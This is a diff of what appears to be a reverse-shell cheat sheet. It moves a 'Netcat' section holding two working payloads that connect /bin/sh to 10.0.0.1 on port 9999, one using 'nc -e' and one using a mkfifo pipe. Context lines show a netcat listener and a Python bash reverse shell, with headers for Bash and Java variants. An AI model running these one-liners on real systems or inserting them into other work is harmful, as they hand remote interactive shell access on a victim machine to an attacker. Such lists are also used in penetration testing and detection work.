@@ -10,6 +10,15 @@ or
 nc -A -l 9999
 ```
 ###
+# Netcat
+```
+nc -e /bin/sh 10.0.0.1 9999
+```
+###
+###
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 9999 >/tmp/f
+```
 
 # Bash
 ```
@@ -66,15 +75,6 @@ p=subprocess.call(["/bin/bash","-i"]);
 ```
 ###
 
-# Netcat
-```
-nc -e /bin/sh 10.0.0.1 9999
-```
-###
-###
-```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 9999 >/tmp/f
-```
 ###
 
 # Java
